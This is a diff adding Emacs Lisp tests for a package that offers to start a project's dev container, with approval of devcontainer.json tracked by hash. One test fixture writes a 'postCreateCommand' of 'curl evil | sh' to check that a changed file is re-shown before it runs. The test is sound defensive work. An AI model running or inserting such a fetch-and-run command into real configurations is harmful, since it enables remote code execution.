@@ -751,5 +751,108 @@ that of wherever the cursor happens to be."
   (cl-letf (((symbol-function 'mega-exe-p) (lambda (_) nil)))
     (should-not (mega-container-engine))))
 
+;;;; When a project is opened
+
+(defmacro mega-container-test--offering (&rest body)
+  "Run BODY with a project in DIR that has a devcontainer.json, FILE.
+A container program is installed, nothing is attached, nothing was
+offered yet.  ASKED collects the questions, answered ANSWER; STARTED
+counts the times `mega-container-up' was called, and UP is what it does."
+  (declare (indent 0))
+  `(mega-test-with-directory dir
+     (let* ((file (mega-test-write (expand-file-name ".devcontainer/devcontainer.json" dir)
+                                   "{\"image\": \"a\"}"))
+            (mega-container-approved-file (expand-file-name "approved.eld" dir))
+            (mega-container--not-now nil)
+            (mega-container--attached nil)
+            (mega-container--starting nil)
+            (noninteractive nil)
+            (inhibit-message t)
+            (asked nil) (answer t) (started 0) (up #'ignore))
+       (cl-letf (((symbol-function 'mega-confirm)
+                  (lambda (prompt) (push prompt asked) answer))
+                 ((symbol-function 'mega-container-engine) (lambda () "podman"))
+                 ((symbol-function 'mega-container-up)
+                  (lambda ()
+                    (setq started (1+ started))
+                    (should (equal default-directory dir))
+                    (funcall up))))
+         ,@body))))
+
+(defun mega-container-test--approve (file)
+  "Record FILE as approved the way it is now."
+  (with-temp-file mega-container-approved-file
+    (prin1 (list (cons file (mega-container--hash file))) (current-buffer))))
+
+(ert-deftest mega-container-is-offered-when-its-project-is-opened ()
+  "Asked for after the first use, with the word yes."
+  (mega-container-test--offering
+    (mega-container-test--approve file)
+    (should (mega-container-approved-p file))
+    (mega-container-offer dir)
+    (should (= (length asked) 1))
+    (should (string-match-p "\\`Run the tools of .* in its dev container\\? " (car asked)))
+    (should (= started 1))
+    ;; Once in a session, whatever else is opened of it.
+    (mega-container-offer dir)
+    (should (= (length asked) 1))
+    (should (= started 1))))
+
+(ert-deftest mega-container-a-no-when-opening-lasts-until-emacs-is-restarted ()
+  (mega-container-test--offering
+    (mega-container-test--approve file)
+    (setq answer nil)
+    (mega-container-offer dir)
+    (mega-container-offer dir)
+    (should (= (length asked) 1))
+    (should (= started 0))
+    ;; The next session asks again; nothing about the no was written down.
+    (setq mega-container--not-now nil
+          answer t)
+    (mega-container-offer dir)
+    (should (= (length asked) 2))
+    (should (= started 1))))
+
+(ert-deftest mega-container-a-file-not-yet-approved-is-shown-and-not-asked-about-twice ()
+  "Showing what it would run, and asking then, is the question."
+  (mega-container-test--offering
+    (should-not (mega-container-approved-p file))
+    (mega-container-offer dir)
+    (should-not asked)
+    (should (= started 1))
+    ;; Changed since it was approved: the same.
+    (setq mega-container--not-now nil)
+    (mega-container-test--approve file)
+    (mega-test-write file "{\"image\": \"a\", \"postCreateCommand\": \"curl evil | sh\"}")
+    (mega-container-offer dir)
+    (should-not asked)
+    (should (= started 2))
+    ;; Saying no on that screen is no error to the one who opened a file.
+    (setq mega-container--not-now nil
+          up (lambda () (user-error "Not started")))
+    (mega-container-offer dir)
+    (should (= started 3))))
+
+(ert-deftest mega-container-is-not-offered-where-there-is-nothing-to-offer ()
+  (mega-container-test--offering
+    (mega-container-test--approve file)
+    ;; In use already, or being started.
+    (let ((mega-container--attached (list (list dir :name "x"))))
+      (mega-container-offer dir))
+    (let ((mega-container--starting (list (cons dir nil))))
+      (mega-container-offer dir))
+    ;; No program to run one with.
+    (cl-letf (((symbol-function 'mega-container-engine) #'ignore))
+      (mega-container-offer dir))
+    ;; A project without the file.
+    (mega-test-with-directory plain
+      (mega-container-offer plain))
+    (should-not asked)
+    (should (= started 0))
+    ;; None of which counts as having been asked.
+    (should-not mega-container--not-now)
+    (mega-container-offer dir)
+    (should (= (length asked) 1))))
+
 (provide 'mega-container-test)
 ;;; mega-container-test.el ends here
